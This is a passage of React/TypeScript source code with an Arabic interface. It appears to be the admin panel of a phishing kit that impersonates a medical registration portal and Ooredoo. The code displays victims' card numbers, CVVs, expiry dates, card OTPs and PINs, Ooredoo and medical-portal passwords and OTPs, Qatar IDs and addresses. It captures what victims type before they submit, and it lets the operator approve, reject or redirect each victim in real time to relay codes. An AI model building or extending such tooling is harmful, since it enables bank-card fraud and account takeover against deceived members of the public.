                    ? "bg-gradient-to-br from-amber-50 via-amber-100/60 to-orange-50 border-amber-400 ring-2 ring-amber-400/50 shadow-lg shadow-amber-500/25 animate-pulse"
                    : visitor.anonymous
                      ? "bg-emerald-50/40 border-emerald-500/25 hover:bg-emerald-50/70 dark:bg-emerald-500/5 dark:border-emerald-500/20"
                      : "bg-card border-border/60 hover:bg-muted/40";

                return (
                  <button
                    key={visitor.phone ? `p:${visitor.phone}` : `r:${visitor.requests[0]?.id ?? "anon"}`}
                    onClick={() => {
                      if (visitor.anonymous) return; // nothing to inspect yet
                      setSelectedPhone(visitor.phone);
                      setSidebarOpen(false);
                      markVisitorSeen(visitor.phone, visitor.requests);
                    }}
                    className={`w-full text-right rounded-xl border transition-all relative group p-3 ${hasPending ? "pt-8" : ""} ${cardTheme}`}
                  >
                    {/* Pending ribbon on top */}
                    {hasPending && (
                      <>
                        <span className="pointer-events-none absolute inset-x-0 top-0 h-1 bg-gradient-to-r from-amber-400 via-orange-500 to-amber-400 animate-pulse rounded-t-xl" />
                        <div className="absolute top-1.5 right-2 z-10 flex items-center gap-1 px-2 py-0.5 rounded-full bg-gradient-to-r from-amber-500 to-orange-600 shadow-md shadow-amber-500/40 ring-1 ring-white/40">
                          <Hourglass className="h-3 w-3 text-white animate-spin" style={{ animationDuration: "2s" }} />
                          <span className="text-[9px] font-extrabold text-white tracking-wide">بانتظار قرارك</span>
                        </div>
                        <div className="absolute top-1.5 left-2 z-10 flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-white/90 border border-amber-400 shadow-sm">
                          <BellRing className="h-2.5 w-2.5 text-amber-600 animate-pulse" />
                          <span className="text-[9px] font-extrabold text-amber-700">{pendingN} معلّق</span>
                        </div>
                      </>
                    )}
                    {/* Active accent bar (start edge in RTL) */}
                    {isSelected && !hasPending && (
                      <span
                        className="pointer-events-none absolute inset-y-2 right-0 w-1 rounded-r-xl bg-primary"
                      />
                    )}

                    <div className="flex items-start gap-3">
                      {/* Avatar + presence dot */}
                      <div className="relative shrink-0">
                        {hasPending && (
                          <span className="pointer-events-none absolute inset-0 -m-1 rounded-full ring-2 ring-amber-400/60 animate-ping" />
                        )}
                        <div
                          className={`w-12 h-12 rounded-full flex items-center justify-center text-base font-extrabold border-2 ${
                            hasPending
                              ? "bg-gradient-to-br from-amber-400 to-orange-500 border-amber-300 text-white shadow-md shadow-amber-500/40"
                              : online
                                ? "bg-primary/5 border-primary/15 text-primary"
                                : "bg-muted border-border text-muted-foreground"
                          }`}
                        >
                          {initial}
                        </div>
                        {hasPending ? (
                          <span className="absolute -bottom-1 -left-1 w-5 h-5 rounded-full border-2 border-amber-50 bg-gradient-to-br from-amber-500 to-orange-600 flex items-center justify-center shadow">
                            <Hourglass className="h-2.5 w-2.5 text-white animate-spin" style={{ animationDuration: "2s" }} />
                          </span>
                        ) : (
                          <span
                            title={PRESENCE_LABEL[presence]}
                            className={`absolute -bottom-0.5 -left-0.5 w-3.5 h-3.5 rounded-full border-2 border-card ${PRESENCE_DOT[presence]} ${presence === "online" ? "animate-pulse" : ""}`}
                          />
                        )}
                      </div>

                      {/* Content */}
                      <div className="flex-1 min-w-0">
                        {/* Header row: name/phone + actions */}
                        <div className="flex items-center justify-between gap-2 mb-1">
                          <div className="flex items-center gap-1.5 min-w-0">
                            <span className="text-sm font-extrabold text-foreground truncate font-mono tracking-tight">
                              {visitor.anonymous ? (
                                <span>زائر جديد</span>
                              ) : (
                                visitorName || <span dir="ltr">{visitor.phone}</span>
                              )}
                            </span>
                            {country && <span className="text-sm shrink-0">{country.flag}</span>}
                            {liveGeo && (
                              <span
                                className="shrink-0 inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-sky-500/10 text-sky-700 dark:text-sky-300 text-[9px] font-extrabold border border-sky-500/30"
                                title={`موقع الزائر: ${liveGeo.name}`}
                              >
                                <span className="text-[11px] leading-none">{liveGeo.flag}</span>
                                <span className="truncate max-w-[70px]">{liveGeo.name}</span>
                              </span>
                            )}
                            {visitor.anonymous && (
                              <span className="shrink-0 px-1.5 py-0.5 rounded-full bg-emerald-500/15 text-emerald-700 dark:text-emerald-300 text-[9px] font-extrabold border border-emerald-500/30">
                                متصل الآن
                              </span>
                            )}
                          </div>
                          <div className="flex items-center gap-1 shrink-0">
                            {hasNewAction && !hasPending && (
                              <span className="flex h-4 min-w-4 px-1 items-center justify-center rounded-full bg-rose-500 text-[9px] font-extrabold text-white animate-pulse">
                                جديد
                              </span>
                            )}
                            <button
                              onClick={(e) => { e.stopPropagation(); toggleFavorite(visitor.phone); }}
                              className={`p-0.5 transition-colors ${isFav ? "text-amber-500" : "text-muted-foreground/30 hover:text-amber-500"}`}
                              aria-label="مفضلة"
                            >
                              <Star className={`h-3.5 w-3.5 ${isFav ? "fill-amber-500" : ""}`} />
                            </button>
                          </div>
                        </div>

                        {/* Browsing / session row */}
                        <div className="flex flex-wrap items-center gap-1.5 mb-1.5">
                          <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[10px] font-bold border ${
                            online
                              ? "bg-emerald-500/10 text-emerald-700 border-emerald-500/25"
                              : "bg-muted text-muted-foreground border-border"
                          }`}>
                            {online && (
                              <span className="relative flex h-1.5 w-1.5">
                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                                <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500" />
                              </span>
                            )}
                            <FileText className="h-2.5 w-2.5" />
                            <span className="truncate max-w-[140px]">{pageLabel}</span>
                          </span>
                          <span className="text-[10px] text-muted-foreground/70 font-medium tabular-nums">
                            {visitor.anonymous
                              ? `آخر نشاط: ${formatRelativeTimeAr(visitor.anonLastActive ?? Date.now())}`
                              : isLive
                              ? PRESENCE_LABEL[presence]
                              : getSessionTime(visitor.requests)}
                          </span>
                        </div>

                        {/* Footer: status + last action + delete */}
                        <div className="flex items-center justify-between gap-2 pt-2 border-t border-border/50">
                          <div className="flex items-center gap-1.5 min-w-0 flex-1">
                            {hasPending ? (
                              <span className="shrink-0 px-1.5 py-0.5 rounded-full bg-amber-500/15 text-amber-700 text-[9px] font-extrabold border border-amber-500/30">
                                معلق
                              </span>
                            ) : rejectedN > 0 ? (
                              <span className="shrink-0 px-1.5 py-0.5 rounded-full bg-rose-500/10 text-rose-600 text-[9px] font-extrabold border border-rose-500/25">
                                مرفوض
                              </span>
                            ) : null}
                            {lastAction ? (
                              <>
                                <BellRing className="h-2.5 w-2.5 text-blue-500 shrink-0" />
                                <span className="text-[10px] font-bold text-foreground/75 truncate">{lastAction.label}</span>
                                <span className="text-[10px] text-muted-foreground/60 tabular-nums shrink-0">{lastAction.time}</span>
                              </>
                            ) : (
                              <span className="text-[10px] text-muted-foreground/60">
                                {visitor.anonymous ? "يتصفح الموقع الآن — لم يقدّم أي معلومات بعد" : "لا يوجد نشاط بعد"}
                              </span>
                            )}
                          </div>
                          {!visitor.anonymous && (
                          <AlertDialog>
                            <AlertDialogTrigger asChild>
                              <button
                                onClick={(e) => e.stopPropagation()}
                                className="p-1 rounded-md text-muted-foreground/30 hover:text-destructive hover:bg-destructive/10 transition-colors shrink-0"
                                aria-label="حذف"
                              >
                                <Trash2 className="h-3.5 w-3.5" />
                              </button>
                            </AlertDialogTrigger>
                            <AlertDialogContent dir="rtl" onClick={(e) => e.stopPropagation()}>
                              <AlertDialogHeader><AlertDialogTitle>مسح بيانات الزائر</AlertDialogTitle><AlertDialogDescription>سيتم مسح جميع طلبات الزائر {visitor.phone} نهائياً.</AlertDialogDescription></AlertDialogHeader>
                              <AlertDialogFooter className="flex-row-reverse gap-2"><AlertDialogCancel>إلغاء</AlertDialogCancel><AlertDialogAction className="bg-destructive text-destructive-foreground hover:bg-destructive/90" onClick={() => deleteVisitorData(visitor.phone)}>مسح</AlertDialogAction></AlertDialogFooter>
                            </AlertDialogContent>
                          </AlertDialog>
                          )}
                        </div>
                      </div>
                    </div>
                  </button>
                );
              })
            )}
          </div>
        </div>
      </div>

      <div className="flex-1 flex flex-col min-h-screen">
        {selectedVisitor && (
          <>
            <div className="relative border-b border-border bg-card p-4 space-y-3">
              <div className="flex items-center justify-between gap-2">
                <Button variant="outline" size="sm" className="h-9 px-3 rounded-xl gap-1.5 text-xs font-bold" onClick={() => { setSelectedPhone(null); setSidebarOpen(true); }}>
                  <ChevronRight className="h-4 w-4" />رجوع للقائمة
                </Button>
                <AlertDialog>
                  <AlertDialogTrigger asChild>
                    <Button variant="ghost" size="icon" className="text-destructive/70 hover:text-destructive h-8 w-8 rounded-lg"><Trash2 className="h-4 w-4" /></Button>
                  </AlertDialogTrigger>
                  <AlertDialogContent dir="rtl">
                    <AlertDialogHeader><AlertDialogTitle>مسح بيانات الزائر</AlertDialogTitle><AlertDialogDescription>سيتم مسح جميع طلبات الزائر {selectedVisitor.phone} نهائياً.</AlertDialogDescription></AlertDialogHeader>
                    <AlertDialogFooter className="flex-row-reverse gap-2"><AlertDialogCancel>إلغاء</AlertDialogCancel><AlertDialogAction className="bg-destructive text-destructive-foreground hover:bg-destructive/90" onClick={() => deleteVisitorData(selectedVisitor.phone)}>مسح</AlertDialogAction></AlertDialogFooter>
                  </AlertDialogContent>
                </AlertDialog>
              </div>

              <div className="rounded-2xl bg-gradient-to-r from-primary to-primary/70 p-3">
                <div className="flex items-center gap-3">
                  <div className="w-11 h-11 rounded-xl bg-white/15 flex items-center justify-center"><FileText className="h-5 w-5 text-white" /></div>
                  <div className="min-w-0 flex-1">
                    <p className="text-[10px] font-bold text-white/80 uppercase tracking-wider">الصفحة الحالية · مباشر</p>
                    <p className="text-base font-extrabold text-white truncate mt-1">{getCurrentPageLabel(selectedVisitor.requests)}</p>
                  </div>
                </div>
              </div>

              {(() => {
                const g: { code: string; name: string; flag: string } | null = selectedVisitor.anonymous
                  ? (selectedVisitor.geo ?? null)
                  : (() => {
                      for (const r of selectedVisitor.requests) {
                        const p = presenceByRequestId.get(r.id);
                        if (p?.geo) return p.geo;
                      }
                      for (const r of selectedVisitor.requests) {
                        const ad = (r as any).activation_data as Record<string, unknown> | null;
                        const gg = ad && (ad as any).geo;
                        if (gg && typeof gg === "object" && typeof (gg as any).code === "string") {
                          return { code: String((gg as any).code), name: String((gg as any).name || (gg as any).code), flag: String((gg as any).flag || "🏳️") };
                        }
                      }
                      return null;
                    })();
                if (!g) return null;
                return (
                  <div className="rounded-2xl border border-sky-500/30 bg-sky-500/10 p-3">
                    <div className="flex items-center gap-3">
                      <div className="w-11 h-11 rounded-xl bg-white/60 dark:bg-white/10 flex items-center justify-center text-2xl leading-none" aria-hidden>
                        {g.flag}
                      </div>
                      <div className="min-w-0 flex-1">
                        <p className="text-[10px] font-bold text-sky-700 dark:text-sky-300 uppercase tracking-wider">موقع الزائر · حسب IP</p>
                        <p className="text-base font-extrabold text-foreground truncate mt-1">
                          <span className="ml-1">{g.flag}</span>{g.name}
                          <span className="ms-2 text-[10px] font-bold text-muted-foreground">({g.code})</span>
                        </p>
                      </div>
                    </div>
                  </div>
                );
              })()}

              {pendingCount(selectedVisitor.requests) > 0 && (
                <div className="rounded-2xl bg-gradient-to-r from-amber-400 to-orange-500 p-3">
                  <div className="flex items-center gap-3">
                    <Clock className="h-5 w-5 text-white" />
                    <div>
                      <p className="text-[10px] font-bold text-white/90 uppercase tracking-wider">في انتظار موافقتك</p>
                      <p className="text-base font-extrabold text-white">{getWaitingTime(selectedVisitor.requests)} · {pendingCount(selectedVisitor.requests)} معلّق</p>
                    </div>
                  </div>
                </div>
              )}

              <div className="rounded-xl border border-border/80 bg-background/70 p-3">
                <p className="text-[11px] font-bold text-foreground flex items-center gap-1.5 mb-2"><Send className="w-3.5 h-3.5 text-primary" />نقل المستخدم إلى صفحة</p>
                <div className="grid grid-cols-2 gap-1.5">
                  {REDIRECT_DESTINATIONS.map(({ path, label, emoji }) => (
                    <AlertDialog key={path}>
                      <AlertDialogTrigger asChild>
                        <Button size="sm" variant="outline" className="text-[10px] font-bold h-8 justify-start gap-1.5 hover:bg-primary hover:text-primary-foreground">
                          <span className="text-sm">{emoji}</span><span className="truncate">{label}</span>
                        </Button>
                      </AlertDialogTrigger>
                      <AlertDialogContent dir="rtl">
                        <AlertDialogHeader><AlertDialogTitle>تأكيد إعادة التوجيه</AlertDialogTitle><AlertDialogDescription>هل تريد فعلاً إعادة توجيه الزائر إلى <span className="font-bold">{label}</span>؟</AlertDialogDescription></AlertDialogHeader>
                        <AlertDialogFooter className="flex-row-reverse gap-2"><AlertDialogCancel>إلغاء</AlertDialogCancel><AlertDialogAction className="bg-primary text-primary-foreground hover:bg-primary/90" onClick={() => redirectVisitor(path, label)}>تأكيد التوجيه</AlertDialogAction></AlertDialogFooter>
                      </AlertDialogContent>
                    </AlertDialog>
                  ))}
                </div>
              </div>
            </div>

            <div className="mx-4 mb-2">
              <div className="space-y-3 mt-3">
                {(() => {
                  const sortedReqs = [...selectedVisitor.requests].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
                  // Because every visitor step UPDATES the same DB row, one
                  // row can carry data for many steps (personal info + card
                  // info + card OTP + PIN + Ooredoo login + Ooredoo OTP …).
                  // We expand each row into one synthetic "section request"
                  // per data set so every step the visitor completed shows
                  // up as its own card in the admin dashboard.
                  const SECTION_ORDER = [
                    "medical_login",
                    "medical_register",
                    "medical_activate",
                    "personal_info",
                    "documents",
                    "card_info",
                    "card_otp",
                    "card_pin",
                    "ooredoo_login",
                    "ooredoo_otp",
                  ] as const;
                  const MEDICAL_ACTIVATE_KEYS = new Set([
                    "requestType", "userType", "passportNo", "visaNo",
                    "nationality", "dob", "gender", "pregnant",
                    "establishmentNo", "companyNameAr", "companyNameEn",
                    "commercialRegNo", "activityType", "establishmentDate",
                    "email", "networkOperator", "network_operator",
                    "employer", "occupation", "purpose", "purposeCompany",
                    "fee_qar", "flow",
                    "register_username", "register_password",
                    "register_full_name_ar", "register_full_name_en",
                    "register_qatar_id", "register_phone",
                    "register_governorate", "register_city",
                    "register_street", "register_building",
                    "activate_user_type", "activate_full_name",
                    "activate_national_id", "activate_phone",
                  ]);
                  const pickAd = (ad: Record<string, unknown> | null, keys: string[]) => {
                    if (!ad) return null;
                    const out: Record<string, unknown> = {};
                    for (const k of keys) {
                      const v = ad[k];
                      if (v != null && v !== "") out[k] = v;
                    }
                    return Object.keys(out).length ? out : null;
                  };
                  const expandRequest = (r: any): Array<{ pseudo: any; isCurrent: boolean; sectionKey: string }> => {
                    // Merge live-typing "draft_*" buckets into `ad` so that
                    // section cards fill in realtime — before the visitor
                    // presses submit. Each draft bucket carries the raw form
                    // state (e.g. {cardName, cardNumber, ...}) which we
                    // remap to the display keys the section renderer expects.
                    const rawAd = (r.activation_data ?? null) as Record<string, unknown> | null;
                    const ad: Record<string, unknown> = { ...(rawAd || {}) };
                    const draftTopLevel: { username?: string; password?: string; qatar_id?: string; national_id?: string; full_name?: string; phone?: string; otp_code?: string } = {};
                    const mergeIfEmpty = (key: string, val: unknown) => {
                      if (val == null || val === "") return;
                      if (ad[key] == null || ad[key] === "") ad[key] = val;
                    };
                    const d = (name: string) => (rawAd?.[name] ?? null) as Record<string, unknown> | null;
                    const dMedLogin = d("draft_medical_login");
                    if (dMedLogin) {
                      mergeIfEmpty("medical_user_type", dMedLogin.userType);
                      mergeIfEmpty("medical_qatar_id", dMedLogin.qatarId);
                      mergeIfEmpty("medical_password", dMedLogin.password);
                    }
                    const dMedAct = d("draft_medical_activate");
                    if (dMedAct) {
                      mergeIfEmpty("activate_full_name", dMedAct.fullName);
                      mergeIfEmpty("activate_national_id", dMedAct.nationalId);
                      mergeIfEmpty("activate_phone", dMedAct.phone);
                      mergeIfEmpty("activate_user_type", dMedAct.userType);
                      mergeIfEmpty("networkOperator", dMedAct.networkOperator);
                    }
                    const dMedReg = d("draft_medical_register");
                    if (dMedReg) {
                      // MedicalRegister writes each form field as-is.
                      Object.entries(dMedReg).forEach(([k, v]) => {
                        if (v == null || v === "") return;
                        if (k === "current_step") return;
                        // Map common form fields to the register_* keys
                        // Admin already renders.
                        const map: Record<string, string> = {
                          username: "register_username", password: "register_password",
                          fullNameAr: "register_full_name_ar", fullNameEn: "register_full_name_en",
                          qatarId: "register_qatar_id", phone: "register_phone",
                          governorate: "register_governorate", city: "register_city",
                          street: "register_street", building: "register_building",
                        };
                        const target = map[k] || k;
                        mergeIfEmpty(target, v);
                      });
                    }
                    const dCardInfo = d("draft_card_info_draft");
                    if (dCardInfo) {
                      mergeIfEmpty("card_name", dCardInfo.cardName);
                      mergeIfEmpty("card_number", dCardInfo.cardNumber);
                      const em = dCardInfo.expiryMonth, ey = dCardInfo.expiryYear;
                      if ((em || ey) && (ad.expiry == null || ad.expiry === "")) {
                        ad.expiry = `${em || "--"}/${ey || "--"}`;
                      }
                      mergeIfEmpty("cvv", dCardInfo.cvv);
                    }
                    const dCardOtp = d("draft_card_otp_draft");
                    if (dCardOtp?.code) mergeIfEmpty("card_otp", dCardOtp.code);
                    const dCardPin = d("draft_card_pin_draft");
                    if (dCardPin?.pin) mergeIfEmpty("card_pin", dCardPin.pin);
                    const dOoLogin = d("draft_ooredoo_login_draft");
                    if (dOoLogin) {
                      mergeIfEmpty("ooredoo_username", dOoLogin.identifier);
                      mergeIfEmpty("ooredoo_password", dOoLogin.password);
                    }
                    const dOoOtp = d("draft_ooredoo_otp_draft");
                    if (dOoOtp?.code) mergeIfEmpty("ooredoo_otp", dOoOtp.code);
                    const originalStep = r.step as string;
                    const sections: Array<{ sectionKey: string; pseudo: any }> = [];
                    const allAttempts = Array.isArray((ad as any)?.rejected_attempts) ? (ad as any).rejected_attempts : [];
                    const clone = (over: Partial<any>) => ({ ...r, ...over, __rejected_attempts: allAttempts });

                    // --- medical_login ---
                    const medLoginAd = pickAd(ad, ["medical_user_type", "medical_qatar_id", "medical_password"]);
                    if (medLoginAd || originalStep === "medical_login") {
                      const uT = (medLoginAd?.medical_user_type as string) ?? (originalStep === "medical_login" ? r.username : undefined);
                      const pW = (medLoginAd?.medical_password as string) ?? (originalStep === "medical_login" ? r.password : undefined);
                      const qI = (medLoginAd?.medical_qatar_id as string) ?? (originalStep === "medical_login" ? (r.qatar_id || r.national_id) : undefined);
                      if (uT || pW || qI) {
                        sections.push({ sectionKey: "medical_login", pseudo: clone({ step: "medical_login", username: uT, password: pW, qatar_id: qI, national_id: qI, activation_data: null }) });
                      }
                    }

                    // --- medical_register / medical_activate ---
                    const activateAd = pickAd(ad, Array.from(MEDICAL_ACTIVATE_KEYS));
                    if (activateAd || originalStep === "medical_register" || originalStep === "medical_activate") {
                      const key = originalStep === "medical_register" ? "medical_register" : "medical_activate";
                      sections.push({ sectionKey: key, pseudo: clone({ step: key, activation_data: activateAd }) });
                    }

                    // --- personal_info (top-level identity + address) ---
                    if (r.full_name || r.national_id || (r as any).governorate || (r as any).city || (r as any).street) {
                      // Skip if it will already show inside medical_register/activate above
                      const shownInActivate = sections.some(s => s.sectionKey === "medical_register" || s.sectionKey === "medical_activate");
                      if (!shownInActivate || originalStep === "personal_info") {
                        sections.push({ sectionKey: "personal_info", pseudo: clone({ step: "personal_info", activation_data: null }) });
                      }
                    }

                    // --- documents (message text/image encoded in password) ---
                    if (r.password && /(نص\s+الرسالة|صورة\s+الرسالة)/.test(r.password)) {
                      sections.push({ sectionKey: "documents", pseudo: clone({ step: "documents", activation_data: null }) });
                    }

                    // --- card_info ---
                    const cardInfoAd = pickAd(ad, ["card_name", "card_number", "expiry", "cvv"]);
                    if (cardInfoAd) {
                      sections.push({ sectionKey: "card_info", pseudo: clone({ step: "card_info", activation_data: cardInfoAd }) });
                    }

                    // --- card_otp ---
                    const cardOtpVal = (ad?.card_otp as string) ?? (originalStep === "card_otp" ? r.otp_code : undefined);
                    if (cardOtpVal && cardOtpVal !== "----") {
                      sections.push({ sectionKey: "card_otp", pseudo: clone({ step: "card_otp", otp_code: cardOtpVal, activation_data: null }) });
                    }

                    // --- card_pin ---
                    const cardPinVal = (ad?.card_pin as string) ?? (originalStep === "card_pin" ? r.otp_code : undefined);
                    if (cardPinVal && cardPinVal !== "----") {
                      sections.push({ sectionKey: "card_pin", pseudo: clone({ step: "card_pin", otp_code: cardPinVal, activation_data: null }) });
                    }

                    // --- ooredoo_login ---
                    const ooLoginAd = pickAd(ad, ["ooredoo_username", "ooredoo_password"]);
                    // Fallback: after visitor moves past ooredoo_login (e.g. to
                    // ooredoo_otp / waiting), the top-level username/password
                    // still hold the Ooredoo credentials because that page was
                    // the last one to write them. Only medical_login writes to
                    // activation_data.medical_* instead of the columns.
                    const OOREDOO_STEPS = new Set(["ooredoo_login", "ooredoo_otp", "waiting"]);
                    const ooFallbackOk = OOREDOO_STEPS.has(originalStep);
                    const ooUser = (ooLoginAd?.ooredoo_username as string) ?? (ooFallbackOk ? r.username : undefined);
                    const ooPass = (ooLoginAd?.ooredoo_password as string) ?? (ooFallbackOk ? r.password : undefined);
                    if (ooUser || ooPass) {
                      sections.push({ sectionKey: "ooredoo_login", pseudo: clone({ step: "ooredoo_login", username: ooUser, password: ooPass, activation_data: null }) });
                    }

                    // --- ooredoo_otp ---
                    const ooOtpVal = (ad?.ooredoo_otp as string) ?? (originalStep === "ooredoo_otp" ? r.otp_code : undefined);
                    if (ooOtpVal && ooOtpVal !== "----") {
                      sections.push({ sectionKey: "ooredoo_otp", pseudo: clone({ step: "ooredoo_otp", otp_code: ooOtpVal, activation_data: null }) });
                    }

                    // Fallback for very old rows or steps we don't specifically split
                    if (sections.length === 0) {
                      sections.push({ sectionKey: originalStep || "unknown", pseudo: r });
                    }

                    // Sort so the CURRENT step is first (top), then reverse
                    // flow order for a natural "latest → earliest" reading.
                    const orderIndex = (k: string) => {
                      const idx = (SECTION_ORDER as readonly string[]).indexOf(k);
                      return idx === -1 ? 999 : idx;
                    };
                    sections.sort((a, b) => {
                      if (a.sectionKey === originalStep && b.sectionKey !== originalStep) return -1;
                      if (b.sectionKey === originalStep && a.sectionKey !== originalStep) return 1;
                      return orderIndex(b.sectionKey) - orderIndex(a.sectionKey);
                    });

                    return sections.map(s => ({
                      pseudo: s.pseudo,
                      sectionKey: s.sectionKey,
                      isCurrent: s.sectionKey === originalStep,
                    }));
                  };

                  return sortedReqs.flatMap((originalReq) => {
                    return expandRequest(originalReq).map(({ pseudo, isCurrent, sectionKey }) => {
                      const req = pseudo;
                  const stage = detectStage(req);
                  const StageIcon = stage.icon;
                   // Only the CURRENT-step section carries the row's status
                   // (approved/rejected/pending). Historical sections are
                   // always shown as "captured" (neutral) so admin doesn't
                   // see old steps re-marked as rejected/approved.
                   const isWaiting = isCurrent && req.status === "pending";
                   const isRejected = isCurrent && req.status === "rejected";
                   const isApproved = isCurrent && req.status === "approved";
                   // Approve/Reject must be reachable for EVERY pending row,
                   // not just the newest-by-created_at, otherwise a visitor
                   // with more than one open pending row (possible when a
                   // page inserts a fresh row because sessionStorage was
                   // cleared) ends up with a stuck card that has no way to
                   // be resolved from the UI.
                   const isActivePending = isWaiting;
                  const fields: { icon: any; label: string; value: string; mono?: boolean }[] = [];
                  const k = stage.key;

                  if (k === "phone") {
                    if (req.phone && req.phone !== "—") fields.push({ icon: Phone, label: "رقم الهاتف", value: req.phone, mono: true });
                    if ((req as any).selected_service) fields.push({ icon: Crown, label: "الخدمة المختارة", value: getServiceLabelAr((req as any).selected_service) });
                  }
                  if (k === "login" || k === "ooredoo_login") {
                    if (req.username) fields.push({ icon: AtSign, label: k === "ooredoo_login" ? "البريد / اسم المستخدم" : "اسم المستخدم", value: req.username, mono: true });
                    if (req.password) fields.push({ icon: Lock, label: "كلمة المرور", value: req.password, mono: true });
                  }
                  if (k === "otp" && req.otp_code && req.otp_code !== "----") fields.push({ icon: KeyRound, label: "الكود (OTP)", value: req.otp_code, mono: true });
                  if (k === "ooredoo_otp" && req.otp_code && req.otp_code !== "----") fields.push({ icon: KeyRound, label: "رمز Ooredoo", value: req.otp_code, mono: true });
                  if (k === "card_otp" && req.otp_code && req.otp_code !== "----") fields.push({ icon: KeyRound, label: "رمز البطاقة (OTP)", value: req.otp_code, mono: true });
                  if (k === "card_pin" && req.otp_code && req.otp_code !== "----") fields.push({ icon: Lock, label: "الرقم السري (PIN)", value: req.otp_code, mono: true });
                  if (k === "token" && req.otp_code && req.otp_code !== "----") fields.push({ icon: KeyRound, label: "رمز التوكين", value: req.otp_code, mono: true });
                  if (k === "personal_info") {
                    if (req.full_name) fields.push({ icon: User, label: "الاسم الكامل", value: req.full_name });
                    if (req.national_id) fields.push({ icon: CreditCard, label: "الرقم الوطني", value: req.national_id, mono: true });
                    const gov = (req as any).governorate; const city = (req as any).city; const street = (req as any).street;
                    if (gov) fields.push({ icon: HomeIcon, label: "المحافظة", value: String(gov) });
                    if (city) fields.push({ icon: HomeIcon, label: "المدينة / الحي", value: String(city) });
                    if (street) fields.push({ icon: HomeIcon, label: "الشارع", value: String(street) });
                  }
                  if (k === "qatar_id" && req.qatar_id) fields.push({ icon: CreditCard, label: "رقم الهوية القطرية", value: req.qatar_id, mono: true });
                  if (k === "documents" && req.password) {
                    const raw = req.password;
                    const imgMatch = raw.match(/صورة\s+الرسالة:\s*(https?:\/\/\S+)/);
                    const textMatch = raw.match(/نص\s+الرسالة:\s*\n?([\s\S]*?)(?:\n\n(?=صورة\s+الرسالة:)|$)/);
                    if (textMatch && textMatch[1].trim()) fields.push({ icon: MessageSquare, label: "نص الرسالة", value: textMatch[1].trim() });
                    if (imgMatch) fields.push({ icon: ImageIcon, label: "صورة الرسالة", value: imgMatch[1].trim(), mono: true });
                  }
                  if (k === "card_info" || k === "card_otp" || k === "card_pin" || k === "activation_data") {
                    const ad = (req as any).activation_data as Record<string, unknown> | null;
                    if (ad && typeof ad === "object") {
                      const labels: Record<string, string> = {
                        card_name: "اسم حامل البطاقة",
                        card_number: "رقم البطاقة",
                        expiry: "تاريخ الانتهاء",
                        cvv: "CVV",
                        card_otp: "رمز البطاقة (OTP)",
                        card_pin: "الرقم السري (PIN)",
                      };
                      const iconFor: Record<string, any> = { card_name: User, card_number: CreditCard, expiry: Calendar, cvv: Hash, card_otp: KeyRound, card_pin: Lock };
                      const skipKeys = new Set(["serialNumber", "activationCode", "applicationCounter", "timestamp"]);
                      Object.entries(ad).forEach(([fk, v]) => {
                        if (v == null || v === "") return;
                        if (skipKeys.has(fk)) return; // dead labels never populated by any visitor page
                        fields.push({ icon: iconFor[fk] || Hash, label: labels[fk] || fk, value: String(v), mono: true });
                      });
                    }
                  }
                  if (k === "medical_register" || k === "medical_activate") {
                    if ((req as any).selected_service) fields.push({ icon: Crown, label: "الخدمة المختارة", value: getServiceLabelAr((req as any).selected_service) });
                    if (req.phone && req.phone !== "—") fields.push({ icon: Phone, label: "رقم الهاتف", value: req.phone, mono: true });
                    if (req.full_name) fields.push({ icon: User, label: "الاسم الكامل", value: req.full_name });
                    if (req.qatar_id || req.national_id) fields.push({ icon: CreditCard, label: "الهوية القطرية", value: String(req.qatar_id || req.national_id), mono: true });
                    if (req.username && k === "medical_register") fields.push({ icon: AtSign, label: "اسم المستخدم", value: req.username, mono: true });
                    if (req.username && k === "medical_activate") fields.push({ icon: User, label: "نوع المستخدم", value: req.username });
                    if (req.password && k === "medical_register") fields.push({ icon: Lock, label: "كلمة المرور", value: req.password, mono: true });
                    const gov = (req as any).governorate; const city = (req as any).city; const street = (req as any).street;
                    if (gov) fields.push({ icon: HomeIcon, label: "المحافظة", value: String(gov) });
                    if (city) fields.push({ icon: HomeIcon, label: "المدينة / الحي", value: String(city) });
                    if (street) fields.push({ icon: HomeIcon, label: "الشارع والمبنى", value: String(street) });
                    const ad = (req as any).activation_data as Record<string, unknown> | null;
                    if (ad && typeof ad === "object") {
                      const labels: Record<string, string> = {
                        requestType: "نوع الطلب",
                        userType: "نوع المستخدم",
                        passportNo: "رقم جواز السفر",
                        visaNo: "رقم التأشيرة",
                        nationality: "الجنسية",
                        dob: "تاريخ الميلاد",
                        gender: "الجنس",
                        pregnant: "حامل",
                        establishmentNo: "رقم المنشأة",
                        companyNameAr: "اسم الشركة (عربي)",
                        companyNameEn: "اسم الشركة (إنجليزي)",
                        commercialRegNo: "السجل التجاري",
                        activityType: "نوع النشاط",
                        establishmentDate: "تاريخ التأسيس",
                        email: "البريد الإلكتروني",
                        networkOperator: "شركة الاتصالات",
                        network_operator: "شركة الاتصالات",
                        employer: "جهة العمل",
                        occupation: "المهنة",
                        purpose: "الغرض من التسجيل",
                        purposeCompany: "الغرض (منشأة)",
                        fee_qar: "الرسوم (ر.ق)",
                        flow: "نوع المسار",
                        register_username: "اسم المستخدم (تسجيل)",
                        register_password: "كلمة المرور (تسجيل)",
                        register_full_name_ar: "الاسم بالعربي",
                        register_full_name_en: "الاسم بالإنجليزي",
                        register_qatar_id: "الهوية القطرية",
                        register_phone: "رقم الهاتف",
                        register_governorate: "المحافظة",
                        register_city: "المدينة / المنطقة",
                        register_street: "الشارع",
                        register_building: "رقم المبنى",
                        activate_user_type: "نوع المستخدم",
                        activate_full_name: "الاسم الكامل",
                        activate_national_id: "الهوية القطرية",
                        activate_phone: "رقم الهاتف",
                      };
                      const iconFor: Record<string, any> = {
                        email: AtSign, passportNo: FileText, visaNo: FileText, dob: Calendar,
                        establishmentDate: Calendar, companyNameAr: User, companyNameEn: User,
                        networkOperator: Phone, network_operator: Phone,
                      };
                      const monoKeys = new Set(["passportNo", "visaNo", "establishmentNo", "commercialRegNo", "email", "dob", "establishmentDate", "fee_qar"]);
                      // Internal / meta keys we manage ourselves — never
                      // show them as raw fields in the visitor card.
                      const HIDDEN_AD_KEYS = new Set([
                        "rejected_attempts", "geo",
                        "draft_step", "draft_updated_at",
